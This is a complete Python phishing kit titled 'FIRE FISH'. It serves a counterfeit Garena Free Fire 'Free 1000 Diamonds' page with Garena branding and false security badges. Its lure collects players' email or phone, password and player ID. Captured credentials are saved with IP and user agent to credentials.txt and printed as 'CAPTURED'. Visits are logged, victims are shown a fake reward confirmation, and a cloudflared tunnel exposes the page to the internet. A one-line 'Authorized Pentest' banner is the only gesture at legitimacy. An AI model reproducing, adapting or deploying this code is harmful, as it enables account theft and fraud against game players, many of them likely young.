#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import json
import os
import threading
import time
from datetime import datetime
import subprocess
import sys

PORT = 8080
CREDS_FILE = "credentials.txt"
VISITS_FILE = "visits.log"

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        self.log_visit()

        if parsed_path.path == '/success.html':
            self.send_success()
        elif parsed_path.path == '/favicon.ico':
            self.send_favicon()
        else:
            self.send_phishing_page()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)

        email_phone = parsed_data.get('email_phone', ['N/A'])[0]
        password = parsed_data.get('password', ['N/A'])[0]
        player_id = parsed_data.get('player_id', ['N/A'])[0]
        ip_address = self.client_address[0]

        victim_data = {
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'email_phone': email_phone,
            'password': password,
            'player_id': player_id,
            'user_agent': self.headers.get('User-Agent', 'unknown'),
            'all_data': dict((k, v[0]) for k, v in parsed_data.items())
        }

        with open(CREDS_FILE, 'a') as f:
            json.dump(victim_data, f, indent=2)
            f.write('\n\n')

        print(f"CAPTURED from {ip_address}:")
        print(f"   Email/Phone: {email_phone}")
        print(f"   Password: {password}")
        print(f"   Player ID: {player_id}")
        print("-" * 60)

        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()

    def log_visit(self):
        visit_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'path': self.path,
            'user_agent': self.headers.get('User-Agent', 'unknown')[:100]
        }
        with open(VISITS_FILE, 'a') as f:
            json.dump(visit_data, f)
            f.write('\n')

    def send_phishing_page(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('X-Frame-Options', 'DENY')
        self.end_headers()
        self.wfile.write(self.get_phishing_html().encode('utf-8'))

    def send_success(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(self.get_success_html().encode('utf-8'))

    def send_favicon(self):
        self.send_response(200)
        self.send_header('Content-Type', 'image/x-icon')
        self.end_headers()
        self.wfile.write(b'')

    def get_phishing_html(self):
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire -Free 1000 Diamonds</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f8f9fa;line-height:1.5;color:#24292e;font-size:14px}
        .page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
        .container{max-width:440px;width:100%;background:#fff;border:1px solid #e1e5e9;border-radius:8px;box-shadow:0 1px 3px rgba(27,31,35,0.1),0 1px 0 rgba(27,31,35,0.03);overflow:hidden}
        .header{padding:32px 40px 24px;text-align:center;border-bottom:1px solid #e1e5e9;background:linear-gradient(135deg,#fafbfc 0%,#f0f1f2 100%)}
        .logo{display:inline-flex;align-items:center;gap:12px;font-size:24px;font-weight:700;color:#1a73e8;margin-bottom:8px}
        .logo-icon{width:40px;height:40px;background:#1a73e8;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;font-weight:600}
        .tagline{font-size:16px;color:#6a737d;font-weight:400;margin-bottom:0}
        .form{padding:32px 40px 40px}
        .form-row{margin-bottom:20px}
        .form-label{display:block;font-size:14px;font-weight:500;color:#24292e;margin-bottom:6px}
        .form-input{width:100%;padding:12px 16px;border:1px solid #d0d7de;border-radius:6px;font-size:14px;color:#24292e;background:#fff;transition:border-color 0.15s,box-shadow 0.15s}
        .form-input:focus{outline:0;border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,0.1)}
        .form-input::placeholder{color:#6a737d}
        .form-group{position:relative}
        .form-hint{font-size:12px;color:#6a737d;margin-top:4px}
        .divider{display:flex;align-items:center;margin:24px 0;color:#6a737d;font-size:14px}
        .divider-line{flex:1;height:1px;background:#e1e5e9}
        .divider-text{padding:0 16px;font-weight:500}
        .submit-btn{width:100%;padding:14px 20px;background:linear-gradient(135deg,#1a73e8 0%,#1659c5 100%);color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.2s}
        .submit-btn:hover{background:linear-gradient(135deg,#1c75e6 0%,#1874ea 100%);transform:translateY(-1px);box-shadow:0 4px 12px rgba(26,115,232,0.3)}
        .submit-btn:disabled{background:#d0d7de;color:#6a737d;cursor:not-allowed;transform:none;box-shadow:none}
        .progress-container{margin:20px 0}
        .progress-bar{height:4px;background:#e1e5e9;border-radius:2px;overflow:hidden}
        .progress-fill{height:100%;background:#28a745;border-radius:2px;transition:width 0.3s ease}
        .progress-text{font-size:12px;color:#6a737d;margin-top:8px;display:flex;justify-content:space-between}
        .security-notice{background:#fff3cd;padding:16px;border-radius:6px;border:1px solid #ffeaa7;margin:24px 0;font-size:13px;color:#856404}
        .security-notice strong{color:#721c24}
        .footer{padding:24px 40px;border-top:1px solid #e1e5e9;background:#fafbfc;text-align:center;font-size:12px;color:#6a737d}
        .trusted-by{display:flex;justify-content:center;align-items:center;gap:20px;margin-top:12px;flex-wrap:wrap}
        .trusted-badge{background:#f6f8fa;padding:4px 8px;border-radius:4px;font-size:11px;font-weight:500}
        @media(max-width:480px){.page{padding:16px}.container{border-radius:0;box-shadow:none}.header{padding:24px 20px}.form{padding:24px 20px 32px}}
        .field-error{border-color:#fa3434 !important;box-shadow:0 0 0 3px rgba(250,52,52,0.1) !important}
        .field-valid{border-color:#28a745 !important;box-shadow:0 0 0 3px rgba(40,167,69,0.1) !important}
    </style>
</head>
<body>
    <div class="page">
        <div class="container">
            <div class="header">
                <div class="logo">
                    <div class="logo-icon">💎</div>
                    Free Fire Free 1000 Diamonds
                </div>
                <p class="tagline">Verify your account to continue accessing rewards</p>
            </div>

            <form method="POST" id="verifyForm">
                <input type="hidden" name="action" value="verify">

                <div class="form-row">
                    <label class="form-label">Email or Phone Number</label>
                    <div class="form-group">
                        <input type="text" name="email_phone" placeholder="name@example.com or +1 (555) 123-4567" required autocomplete="email">
                        <div class="form-hint">We'll use this to verify your account ownership</div>
                    </div>
                </div>

                <div class="form-row">
                    <label class="form-label">Account Password</label>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
                        <div class="form-hint">Required for security verification</div>
                    </div>
                </div>

                <div class="form-row">
                    <label class="form-label">Player ID (Free Fire ID)</label>
                    <div class="form-group">
                        <input type="text" name="player_id" placeholder="Free Fire Id" maxlength="10" required>
                        <div class="form-hint">Free Fire Id in your profile</div>
                    </div>
                </div>

                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" style="width:0%" id="progress"></div>
                    </div>
                    <div class="progress-text">
                        <span id="progress-label">Complete all fields</span>
                        <span id="progress-percent">0%</span>
                    </div>
                </div>

                <div class="security-notice">
                    <strong>🔒 Secure Verification</strong> - Your information is protected with enterprise-grade encryption.
                    Garena will never ask for your password unless verifying account ownership.
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">
                    Verify Account & Claim Rewards
                </button>
            </form>

            <div class="footer">
                <div>&copy; 2026 Garena Online. All rights reserved.</div>
                <div class="trusted-by">
                    <div class="trusted-badge">Protected by Cloudflare</div>
                    <div class="trusted-badge">Google Cloud</div>
                    <div class="trusted-badge">AWS Verified</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('verifyForm');
        const inputs = form.querySelectorAll('input[required]');
        const progress = document.getElementById('progress');
        const progressLabel = document.getElementById('progress-label');
        const progressPercent = document.getElementById('progress-percent');
        const submitBtn = document.getElementById('submitBtn');

        function updateProgress() {
            const filled = Array.from(inputs).filter(input => input.value.trim().length > 0).length;
            const total = inputs.length;
            const percent = Math.round((filled / total) * 100);

            progress.style.width = percent + '%';
            progressPercent.textContent = percent + '%';

            if (percent === 100) {
                progressLabel.textContent = 'Ready to verify';
            } else {
                progressLabel.textContent = 'Complete all fields';
            }
        }

        inputs.forEach(input => {
            input.addEventListener('input', () => {
                const value = input.value.trim();

                // Clear previous validation
                input.classList.remove('field-error', 'field-valid');

                // Real-time validation feedback
                if (value.length > 0) {
                    if (input.name === 'email_phone') {
                        const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value) || /^[\+]?[1-9][\d]{0,15}$/.test(value.replace(/[\s\-\(\)]/g, ''));
                        input.classList.toggle('field-valid', isValid);
                        input.classList.toggle('field-error', !isValid);
                    } else if (input.name === 'password') {
                        input.classList.toggle('field-valid', value.length >= 6);
                        input.classList.toggle('field-error', value.length > 0 && value.length < 6);
                    } else if (input.name === 'player_id') {
                        const isNumeric = /^\d{0,17}$/.test(value);
                        input.classList.toggle('field-valid', isNumeric && value.length >= 12);
                        input.classList.toggle('field-error', !isNumeric);
                    }
                }

                updateProgress();
            });
        });

        form.addEventListener('submit', function(e) {
            const validFields = Array.from(inputs).every(input => {
                const value = input.value.trim();
                return value.length > 0 && !input.classList.contains('field-error');
            });

            if (!validFields) {
                e.preventDefault();
                alert('Please fix errors in red fields before submitting.');
                return false;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Verifying Account...';
            submitBtn.style.background = 'linear-gradient(135deg, #6c757d 0%, #5a6268 100%)';
        });

        // Auto-focus first field
        inputs[0].focus();
    </script>
</body>
</html>'''

    def get_success_html(self):
        return '''<!DOCTYPE html>
<html><head><title>Verification Successful</title><style>:root{--success:#27ae60;--dark:#1a1a2e;--gold:#f39c12}body{font-family:'SF Pro Display',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,var(--success),#2ecc71);color:var(--dark);text-align:center;padding:60px;font-size:22px;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;max-width:600px;margin:0 auto}.container{background:rgba(255,255,255,0.1);backdrop-filter:blur(25px);padding:60px 48px;border-radius:28px;border:1px solid rgba(255,255,255,0.2);box-shadow:0 40px 120px rgba(39,174,96,0.3)}.success-icon{width:140px;height:140px;background:linear-gradient(135deg,#ffffff,#f8f9ff);border-radius:50%;margin:0 auto 45px;display:flex;align-items:center;justify-content:center;font-size:64px;font-weight:700;color:var(--success);border:6px solid rgba(255,255,255,0.5);box-shadow:0 30px 90px rgba(39,174,96,0.25)}.title{font-size:42px;font-weight:700;margin:30px 0 20px;color:var(--dark);letter-spacing:-0.8px}.message{font-size:19px;color:#2c3e50;margin-bottom:40px;max-width:520px;line-height:1.7}.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:28px;margin:50px 0;padding:40px;background:rgba(255,255,255,0.2);backdrop-filter:blur(20px);border-radius:24px;border:1px solid rgba(255,255,255,0.3)}.status-item{background:rgba(255,255,255,0.95);padding:24px 32px;border-radius:20px;box-shadow:0 12px 40px rgba(0,0,0,0.1);font-weight:600;font-size:17px;text-align:center}.btn{display:inline-block;padding:24px 52px;background:linear-gradient(135deg,var(--gold),#f1c40f);color:var(--dark);text-decoration:none;border-radius:20px;font-weight:600;font-size:18px;margin-top:35px;text-transform:uppercase;letter-spacing:0.6px;box-shadow:0 20px 70px rgba(243,156,18,0.35);transition:all 0.3s}.btn:hover{transform:translateY(-5px);box-shadow:0 30px 90px rgba(243,156,18,0.45)}.footer{margin-top:70px;padding-top:45px;border-top:3px solid rgba(255,255,255,0.5);font-size:15px;color:rgba(255,255,255,0.98);max-width:520px;line-height:1.6}@media(max-width:480px){body{padding:40px 20px;font-size:19px}.container{padding:45px 32px}.status-grid{grid-template-columns:1fr;gap:20px;padding:28px}}</style></head>
<body>
    <div class="container">
        <div class="success-icon">✓</div>
        <h1 class="title">Verification Successful</h1>
        <div class="message">
            All account details verified successfully. Diamond rewards have been credited
            to your Free Fire account and will appear after game restart (60 seconds).
        </div>

        <div class="status-grid">
            <div class="status-item">Email/Phone ✓</div>
            <div class="status-item">Password ✓</div>
            <div class="status-item">Player ID ✓</div>
        </div>

        <div style="font-size:24px;font-weight:600;margin:35px 0;color:#2c3e50;">
            Rewards delivered - restart game to view balance
        </div>

        <a href="/" class="btn">Verify Another Account</a>

        <div class="footer">
            <p>&copy; 2026 Garena Free Fire Enterprise Rewards Platform</p>
            <p>Protected by military-grade encryption and fraud detection systems</p>
        </div>
    </div>
</body>
<script>setTimeout(()=>location.href='/',9000)</script></html>'''

def start_cloudflared():
    print("🌐 Starting Cloudflare Tunnel...")
    try:
        subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{PORT}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        print("✅ Start Cloudflare Tunnel In New Session!")
        return True
    except FileNotFoundError:
        print("❌ Install cloudflared:")
        print("wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
        print("chmod +x cloudflared && mv cloudflared $PREFIX/bin/")
        sys.exit(1)

import os
import time
import shutil
import threading
import socketserver

# -------------------------------
# FIRE FISH ANIMATED BANNER
# -------------------------------
FIRE_FISH = [
    "███████╗██╗██████╗ ███████╗    ███████╗██╗███████╗██╗  ██╗",
    "██╔════╝██║██╔══██╗██╔════╝    ██╔════╝██║██╔════╝██║  ██║",
    "█████╗  ██║██████╔╝█████╗      █████╗  ██║███████╗███████║",
    "██╔══╝  ██║██╔══██╗██╔══╝      ██╔══╝  ██║╚════██║██╔══██║",
    "██║     ██║██║  ██║███████╗    ██║     ██║███████╗██║  ██║",
    "╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝",
]

# -------------------------------
# ANSI COLORS (Professional)
# -------------------------------
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
RESET  = "\033[0m"

BOLD = "\033[1m"
DIM  = "\033[2m"

COLORS = [RED, YELLOW, BLUE, CYAN, WHITE]
GLOW_COLORS = [CYAN, BLUE]

def term_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

def center(text):
    return text.center(term_width())

def animated_banner(duration=2.5, delay=0.12):
    end = time.time() + duration
    i = 0
    while time.time() < end:
        os.system("clear")
        color = COLORS[i % len(COLORS)]
        for line in FIRE_FISH:
            print(color + center(line) + RESET)
        print()
        print(CYAN + center("🔥 FIRE FISH :: Real-Time Server Engine") + RESET)
        print(WHITE + center("© Adwaith Pramod") + RESET)
        time.sleep(delay)
        i += 1

# -------------------------------
# AFTER-GLOW EFFECT (VISUAL ONLY)
# -------------------------------
def glow_banner(cycles=2, delay=0.08):
    for _ in range(cycles):
        for glow in GLOW_COLORS:
            os.system("clear")
            for line in FIRE_FISH:
                print(BOLD + glow + center(line) + RESET)
            print()
            print(BOLD + CYAN + center("🔥 FIRE FISH :: Real-Time Server Engine") + RESET)
            print(DIM + WHITE + center("© Adwaith Pramod") + RESET)
            time.sleep(delay)

    # Final steady glow
    os.system("clear")
    for line in FIRE_FISH:
        print(BOLD + CYAN + center(line) + RESET)
    print()
    print(BOLD + CYAN + center("🔥 FIRE FISH :: Real-Time Server Engine") + RESET)
    print(DIM + WHITE + center("© Adwaith Pramod") + RESET)

# -------------------------------
# MAIN
# -------------------------------
def main():
    animated_banner()
    glow_banner()   # 👈 glow AFTER animation ends

    print(RED + "🚀 Free Fire GitHub/Google Style Phishing (Authorized Pentest)" + RESET)
    print(BLUE + "=" * 75 + RESET)
    print(CYAN + "📱 Professional Design | Real-time Validation | Trust Indicators" + RESET)
    print(BLUE + "=" * 75 + RESET)

    threading.Thread(target=start_cloudflared, daemon=True).start()

    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
        print(GREEN + f"✅ Server: http://127.0.0.1:{PORT}" + RESET)
        print(YELLOW + "🎣 Monitor: tail -f credentials.txt" + RESET)
        print(CYAN + "📊 Visits: tail -f visits.log" + RESET)
        print(RED + "🛑 Ctrl+C to stop" + RESET)
        print(BLUE + "=" * 75 + RESET)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(YELLOW + "\n👋 Server stopped" + RESET)

if __name__ == "__main__":
    main()
